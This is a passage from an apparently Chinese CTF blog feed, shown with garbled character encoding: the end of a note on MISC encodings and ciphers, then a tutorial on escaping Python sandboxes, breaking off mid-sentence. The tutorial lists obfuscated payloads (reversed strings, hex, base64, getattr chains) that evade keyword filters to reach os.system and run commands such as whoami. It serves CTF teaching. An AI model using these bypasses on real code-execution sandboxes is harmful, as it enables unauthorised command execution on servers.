æ–¹å¼ï¼Œä¸»è¦ç”¨äºäº§ç”ŸBitcoinçš„é’±åŒ…åœ°å€ï¼ŒBase58ä¸ä½¿ç”¨æ•°å­—<code>0</code>ï¼Œå­—æ¯å¤§å†™<code>O</code>ï¼Œå­—æ¯å¤§å†™<code>I</code>ï¼Œå’Œå­—æ¯å°å†™<code>l</code>ï¼Œä»¥åŠ<code>+</code>å’Œ<code>/</code>ç¬¦å·</p><ul><li>base62ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±62å­—ç¬¦<code>(0-9ï¼Œa-zï¼ŒA-Z)</code>ç»„æˆ</p><ul><li>base91ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±91ä¸ªå­—ç¬¦<code>(0-9ï¼Œa-zï¼ŒA-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;â€)</code>ç»„æˆ</p><ul><li>base92ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±92ä¸ªå­—ç¬¦<code>(0-9ï¼Œa-zï¼ŒA-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;â€~0</code>ç»„æˆ</p><p><strong>æ¯”base91å¤šäº†ä¸€ä¸ª<code>~</code></strong></p><ul><li>base100ç¼–ç </li></ul><p>ç‰¹å¾ç‰¹ç‚¹ï¼šå¯†æ–‡ç”±ä¸€å †è¡¨æƒ…ç»„æˆ</p><p><a href="https://ctf.bugku.com/tools.html">åœ¨çº¿å·¥å…·</a></p><h3 id="è«å°”æ–¯ç¼–ç ï¼ˆMorse-Codeï¼‰"><a href="#è«å°”æ–¯ç¼–ç ï¼ˆMorse-Codeï¼‰" class="headerlink" title="è«å°”æ–¯ç¼–ç ï¼ˆMorse Codeï¼‰"></a>è«å°”æ–¯ç¼–ç ï¼ˆMorse Codeï¼‰</h3><blockquote><p>æ‘©å°”æ–¯ç”µç ï¼ˆMorse codeï¼‰ä¹Ÿè¢«ç§°ä½œæ‘©æ–¯å¯†ç ï¼Œæ˜¯ä¸€ç§æ—¶é€šæ—¶æ–­çš„ä¿¡å·ä»£ç ï¼Œé€šè¿‡ä¸åŒçš„æ’åˆ—é¡ºåºæ¥è¡¨è¾¾ä¸åŒçš„è‹±æ–‡å­—æ¯ã€æ•°å­—å’Œæ ‡ç‚¹ç¬¦å·ã€‚</p></blockquote><p><img src="/img/MISC/mosi.jpg" alt=""></p><p><a href="http://msmm.qianwanku.com/">åœ¨çº¿å·¥å…·</a></p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>shellcodeæ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´è€Œæ‰§è¡Œçš„ä»£ç ï¼Œshellcodeä¸º16è¿›åˆ¶çš„æœºå™¨ç ï¼Œå› ä¸ºç»å¸¸è®©æ”»å‡»è€…è·å¾—shellè€Œå¾—åã€‚shellcodeå¸¸å¸¸ä½¿ç”¨æœºå™¨è¯­è¨€ç¼–å†™ã€‚ å¯åœ¨æš‚å­˜å™¨eipæº¢å‡ºåï¼Œå¡å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œè®©ç”µè„‘å¯ä»¥æ‰§è¡Œæ”»å‡»è€…çš„ä»»æ„æŒ‡ä»¤ã€‚</p></blockquote><p><img src="/img/MISC/shellcode.png" alt=""></p><h3 id="XXencodeç¼–ç "><a href="#XXencodeç¼–ç " class="headerlink" title="XXencodeç¼–ç "></a>XXencodeç¼–ç </h3><blockquote><p>XXEncodeæ˜¯ä¸€ç§äºŒè¿›åˆ¶åˆ°æ–‡å­—çš„ç¼–ç ï¼å®ƒè·ŸUUEncodeä»¥åŠBase64ç¼–ç æ–¹æ³•å¾ˆç±»ä¼¼ã€‚å®ƒä¹Ÿæ˜¯å®šä¹‰äº†ç”¨å¯æ‰“å°å­—ç¬¦è¡¨ç¤ºäºŒè¿›åˆ¶æ–‡å­—ä¸€ç§æ–¹æ³•ï¼Œä¸æ˜¯ä¸€ç§æ–°çš„ç¼–ç é›†åˆã€‚XXEncodeå°†è¾“å…¥æ–‡æœ¬ä»¥æ¯ä¸‰ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ï¼Œå¦‚æœæœ€åå‰©ä¸‹çš„èµ„æ–™å°‘äºä¸‰ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿçš„éƒ¨ä»½ç”¨é›¶è¡¥é½ã€‚ä¸‰ä¸ªå­—èŠ‚å…±æœ‰24ä¸ªBitï¼Œä»¥6-bitä¸ºå•ä½åˆ†ä¸º4ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä»¥åè¿›åˆ¶æ¥è¡¨ç¤ºæ‰€å‡ºç°çš„å­—èŠ‚çš„æ•°å€¼ã€‚è¿™ä¸ªæ•°å€¼åªä¼šè½åœ¨0åˆ°63ä¹‹é—´ã€‚å®ƒ64å¯æ‰“å°å­—ç¬¦å›ºå®šå­—ç¬¦èŒƒå›´åŠé¡ºåºï¼åŒ…æ‹¬å¤§å°å†™å­—æ¯ã€æ•°å­—ä»¥åŠ+-å­—ç¬¦ã€‚å®ƒè¾ƒUUEncodeç¼–ç ä¼˜ç‚¹åœ¨äºå®ƒ64å­—ç¬¦æ˜¯å¸¸è§å­—ç¬¦ï¼Œæ²¡æœ‰ä»»ä½•ç‰¹æ®Šå­—ç¬¦ï¼</p></blockquote><p><a href="http://www.atoolbox.net/Tool.php?Id=780">åœ¨çº¿å·¥å…·</a></p><h3 id="UUencodeç¼–ç "><a href="#UUencodeç¼–ç " class="headerlink" title="UUencodeç¼–ç "></a>UUencodeç¼–ç </h3><blockquote><p>UUENCODEæ˜¯å°†<a href="https://baike.baidu.com/item/äºŒè¿›åˆ¶æ–‡ä»¶/996661?fromModule=lemma_inlink">äºŒè¿›åˆ¶æ–‡ä»¶</a>è½¬æ¢ä¸ºæ–‡æœ¬<a href="https://baike.baidu.com/item/æ–‡ä»¶?fromModule=lemma_inlink">æ–‡ä»¶</a>çš„è¿‡ç¨‹ï¼Œè½¬æ¢åçš„æ–‡ä»¶å¯ä»¥é€šè¿‡çº¯æ–‡æœ¬e-mailè¿›è¡Œä¼ è¾“ï¼Œåœ¨æ¥æ”¶æ–¹å¯¹è¯¥æ–‡ä»¶è¿›è¡Œuudecodeï¼Œå³å°†å…¶è½¬æ¢ä¸ºåˆå§‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p></blockquote><p><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">åœ¨çº¿å·¥å…·</a></p><h3 id="aaencodeç¼–ç "><a href="#aaencodeç¼–ç " class="headerlink" title="aaencodeç¼–ç "></a>aaencodeç¼–ç </h3><blockquote><p>å°†jsä»£ç è½¬æ¢æˆå¸¸ç”¨çš„ç½‘ç»œè¡¨æƒ…ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„é¢œæ–‡å­—jsåŠ å¯†</p></blockquote><p><a href="http://www.hiencode.com/aaencode.html">åœ¨çº¿å·¥å…·</a></p><h3 id="JSfuck"><a href="#JSfuck" class="headerlink" title="JSfuck"></a>JSfuck</h3><blockquote><p>JSfuckåªæ˜¯ç”¨6ç§å­—ç¬¦<code>[]!()+</code></p></blockquote><p><a href="https://www.bugku.com/tools/jsfuck/">åœ¨çº¿å·¥å…·)</a></p><h3 id="jother"><a href="#jother" class="headerlink" title="jother"></a>jother</h3><blockquote><p>jotheråªæ˜¯ç”¨å…«ç§å­—ç¬¦<code>[]!()+&#123;&#125;</code></p><p>å¯ä»¥æ‰“å¼€è°·æ­Œæµè§ˆå™¨ æŒ‰F12<br>ç„¶åconsoleå°†é‚£å †è§£ç çš„ä¸œè¥¿å¤åˆ¶è¿‡å» æŒ‰å›è½¦å³å¯è§£ç </p></blockquote><h3 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h3><blockquote><p>Brainfuckä½¿ç”¨å…«ç§å­—ç¬¦ï¼Œ<code>&gt;&lt;+-.,[]</code>çš„ç»„åˆæ¥å®Œæˆ</p></blockquote><p><a href="https://ctf.bugku.com/tool/brainfuck">åœ¨çº¿å·¥å…·</a></p><h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook"></a>Ook</h3><blockquote><p>ookå¯†ç ä¸­æœ‰å¤§é‡ookï¼ŒåŠ ä¸Šä¸€äº›ç¬¦å·</p></blockquote><p><a href="https://www.splitbrain.org/services/ook">åœ¨çº¿å·¥å…·</a></p><h3 id="æ•²å‡»ç "><a href="#æ•²å‡»ç " class="headerlink" title="æ•²å‡»ç "></a>æ•²å‡»ç </h3><blockquote><p>æ•²å‡»ç (Tap code)æ˜¯ä¸€ç§ä»¥éå¸¸ç®€å•çš„æ–¹å¼å¯¹æ–‡æœ¬ä¿¡æ¯è¿›è¡Œç¼–ç çš„æ–¹æ³•ã€‚å› è¯¥ç¼–ç å¯¹ä¿¡æ¯é€šè¿‡ä½¿ç”¨ä¸€ç³»åˆ—çš„ç‚¹å‡»å£°éŸ³æ¥ç¼–ç è€Œå‘½åï¼Œæ•²å‡»ç æ˜¯åŸºäº5Ã—5æ–¹æ ¼æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µæ¥å®ç°çš„ï¼Œä¸åŒç‚¹æ˜¯æ˜¯ç”¨Kå­—æ¯è¢«æ•´åˆåˆ°Cä¸­ã€‚</p></blockquote><p>æ•²å‡»ç è¡¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![shehui](/img/MISC/shehui.png)#!shell</span><br><span class="line">  1  2  3  4  5</span><br><span class="line">1 A  B C/K D  E</span><br><span class="line">2 F  G  H  I  J </span><br><span class="line">3 L  M  N  O  P</span><br><span class="line">4 Q  R  S  T  U</span><br><span class="line">5 V  W  X  Y  Z</span><br></pre></td></tr></table></figure><p><img src="/img/MISC/qiaoji.png" alt=""></p><h2 id="ç¨€å¥‡å¤æ€ªçš„ç¼–ç "><a href="#ç¨€å¥‡å¤æ€ªçš„ç¼–ç " class="headerlink" title="ç¨€å¥‡å¤æ€ªçš„ç¼–ç "></a>ç¨€å¥‡å¤æ€ªçš„ç¼–ç </h2><h3 id="ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚"><a href="#ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚" class="headerlink" title="ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚"></a>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚</h3><p>ç‰¹ç‚¹ï¼šå­—ç¬¦å…¨éƒ¨éƒ½æ˜¯ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚</p><p><img src="/img/MISC/shehui.png" alt=""></p><p><a href="http://z.duoluosb.com/">åœ¨çº¿å·¥å…·</a></p><h3 id="ä¸ä½›è®ºç¦…"><a href="#ä¸ä½›è®ºç¦…" class="headerlink" title="ä¸ä½›è®ºç¦…"></a>ä¸ä½›è®ºç¦…</h3><p>ç‰¹ç‚¹ï¼šä¸€äº›ç¨€å¥‡å¤æ€ªä¸è®¤è¯†çš„å­—</p><p><img src="/img/MISC/fo.png" alt=""></p><p><a href="http://www.atoolbox.net/Tool.php?Id=1027">åœ¨çº¿å·¥å…·</a></p><h3 id="ä¸ç†Šè®ºé“"><a href="#ä¸ç†Šè®ºé“" class="headerlink" title="ä¸ç†Šè®ºé“"></a>ä¸ç†Šè®ºé“</h3><p><img src="/img/MISC/xiong.png" alt=""></p><p><a href="http://hi.pcmoe.net/">åœ¨çº¿å·¥å…·</a></p><h3 id="å…½éŸ³è¯‘è€…"><a href="#å…½éŸ³è¯‘è€…" class="headerlink" title="å…½éŸ³è¯‘è€…"></a>å…½éŸ³è¯‘è€…</h3><p><img src="/img/MISC/shou.png" alt=""></p><p><a href="http://hi.pcmoe.net/roar.html">åœ¨çº¿å·¥å…·</a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pythonæ²™ç®±é€ƒé€¸</title>
      <link href="/2023/07/28/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/07/28/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p>Python çš„æ²™ç®±é€ƒé€¸çš„æœ€ç»ˆç›®æ ‡å°±æ˜¯æ‰§è¡Œç³»ç»Ÿä»»æ„å‘½ä»¤ï¼Œæ¬¡ä¸€ç‚¹çš„å†™æ–‡ä»¶ï¼Œå†æ¬¡ä¸€ç‚¹çš„è¯»æ–‡ä»¶ã€‚</p><p>è®©ç”¨æˆ·æäº¤ Python ä»£ç å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œæ˜¯ä¸€äº› <a href="https://so.csdn.net/so/search?q=OJ&amp;spm=1001.2101.3001.7020">OJ</a>ã€é‡åŒ–ç½‘ç«™é‡è¦çš„æœåŠ¡ï¼Œå¾ˆå¤š CTF ä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ã€‚ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå°±éœ€è¦ç¡®ä¿ Python è¿è¡Œåœ¨æ²™ç®±ä¸­ã€‚æ²™ç®±ç»å¸¸ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿçš„å‡½æ•°ï¼Œä¾‹å¦‚osç­‰</p></blockquote><h1 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h1><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>åœ¨ Python ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰ï¼š</p><ul><li><code>os</code></li><li><code>commandsï¼š</code>ç‰ˆæœ¬é™åˆ¶ï¼š<code>2.x</code></li><li><code>subprocess</code></li><li><code>timeitï¼š</code> <code>timeit.sysã€timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></li><li><code>platformï¼š</code> <code>platform.osã€platform.sysã€platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()</code></li></ul><ul><li><code>ptyï¼š</code> <code>pty.spawn(&#39;ls&#39;)</code>ã€<code>pty.os</code></li><li><code>bdbï¼š</code> <code>bdb.os</code>ã€<code>cgi.sys</code></li><li><code>cgiï¼š</code> <code>cgi.os</code>ã€<code>cgi.sys</code></li><li>â€¦</li></ul><h2 id="å¯¼å…¥æ¨¡å—"><a href="#å¯¼å…¥æ¨¡å—" class="headerlink" title="å¯¼å…¥æ¨¡å—"></a>å¯¼å…¥æ¨¡å—</h2><blockquote><p>Pythonå¯¼å…¥æ¨¡å—æ—¶ï¼Œä¼šå…ˆåˆ¤æ–­<code>sys.modules</code>æ˜¯å¦å·²ç»åŠ è½½äº†è¯¥æ¨¡å—ï¼Œå¦‚æœæ²¡æœ‰åŠ è½½åˆ™ä»<code>sys.path</code>ä¸­çš„ç›®å½•æŒ‰ç…§æ¨¡å—åæŸ¥æ‰¾<code>py</code>ã€<code>pyc</code>ã€<code>pyd</code>æ–‡ä»¶ï¼Œæ‰¾åˆ°åæ‰§è¡Œè¯¥æ–‡ä»¶è½½å…¥å†…å­˜å¹¶æ·»åŠ è‡³<code>sys.modules</code>ä¸­ï¼Œå†å°†æ¨¡å—åç§°å¯¼å…¥Localå‘½åç©ºé—´ã€‚å¦‚æœ<code>a.py</code>ä¸­å­˜åœ¨<code>import b</code>ï¼Œåˆ™åœ¨<code>import a</code>æ—¶<code>ab</code>ä¸¤ä¸ªæ¨¡å—éƒ½ä¼šæ·»åŠ è‡³<code>sys.modules</code>ä¸­ï¼Œä½†ä»…å°†<code>a</code>å¯¼å…¥Localå‘½åç©ºé—´ã€‚é€šè¿‡<code>from x import y</code>æ—¶ï¼Œåˆ™å°†<code>x</code>æ·»åŠ è‡³<code>sys.modules</code>ä¸­ï¼Œå°†<code>y</code>å¯¼å…¥Localå‘½åç©ºé—´ã€‚</p></blockquote> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">__import__</span>(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(f.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line"><span class="built_in">exec</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3/os.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²"><a href="#èŠ±å¼å¤„ç†å­—ç¬¦ä¸²" class="headerlink" title="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²"></a>èŠ±å¼å¤„ç†å­—ç¬¦ä¸²</h2><p>ä»£ç è¦æ˜¯å‡ºç°<code>os</code>ï¼Œç›´æ¥ä¸è®©è¿è¡Œï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥<code>os</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="built_in">__import__</span>(a+b).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€æ‹¼æ¥ã€base64ã€hexã€rot13â€¦ç­‰ç­‰</span></span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>] == </span><br><span class="line">[<span class="string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>] == <span class="comment">#hex</span></span><br><span class="line">[<span class="string">u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>] == <span class="comment">#Unicode</span></span><br><span class="line">[<span class="string">&#x27;X19idWlsdGluc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)] == <span class="comment">#base64</span></span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>] == <span class="comment">#+æ‹¼æ¥</span></span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>] == </span><br><span class="line">[<span class="string">&quot;_builtins_&quot;</span>.join(<span class="string">&quot;__&quot;</span>)] == </span><br><span class="line">[<span class="string">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27;</span> % (<span class="number">95</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">95</span>)]<span class="comment">#chr</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿‡æ»¤äº†æ•°å­—ï¼š</p><blockquote><p>\1. 0ï¼š<code>int(bool([]))</code>ã€<code>Flase</code>ã€<code>len([])</code><br>\2. 1ï¼š<code>int(bool([&quot;&quot;]))</code>ã€<code>True</code><br>\3. è·å–ç¨å¾®å¤§çš„æ•°å­—ï¼š<code>len(str(&#123;&#125;.keys))</code>ï¼Œä¸è¿‡éœ€è¦æ…¢æ…¢æ‰¾é•¿åº¦ç¬¦åˆçš„å­—ç¬¦ä¸²<br>\4. 1.0ï¼š<code>float(True)</code></p></blockquote><p>å…¶å®æœ‰äº† <code>0</code> å°±å¯ä»¥äº†ï¼Œè¦å•¥æ•´æ•°ç›´æ¥åšè¿ç®—å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="èŠ±å¼æ‰§è¡Œå‡½æ•°"><a href="#èŠ±å¼æ‰§è¡Œå‡½æ•°" class="headerlink" title="èŠ±å¼æ‰§è¡Œå‡½æ•°"></a>èŠ±å¼æ‰§è¡Œå‡½æ•°</h2><p>os ä¸­èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()) </span><br><span class="line"><span class="built_in">print</span>(os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line"><span class="built_in">print</span>(os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line"><span class="built_in">print</span>(os.popen4(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ <code>getattr</code> æ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">getattr</span>(os, <span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>ä¸è®©å‡ºç° importä¹Ÿæ²¡äº‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(__builtins__, <span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸"><a href="#é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸" class="headerlink" title="é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸"></a>é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸</h2><p><code>.__mro__</code> æˆ– <code>.mro()</code>ï¼Œæ˜¯ä¸ªå…ƒç»„ï¼Œè®°å½•äº†ç»§æ‰¿å…³ç³»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>ç±»çš„å®ä¾‹åœ¨è·å– <code>__class__</code> å±æ€§æ—¶ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹åº”çš„ç±»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œ<code>&#39;&#39;</code>å±äº <code>str</code>ç±»ï¼Œå®ƒç»§æ‰¿äº† <code>object</code> ç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ‰€æœ‰ç±»çš„è¶…ç±»ã€‚å…·æœ‰ç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰<code>__base__</code>å’Œ<code>__bases__</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»å…¸ç±»éœ€è¦æŒ‡æ˜ç»§æ‰¿ object æ‰ä¼šç»§æ‰¿å®ƒï¼Œå¦åˆ™æ˜¯ä¸ä¼šç»§æ‰¿çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.__bases__</span><br><span class="line">()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æ³•ç›´æ¥å¼•å…¥ 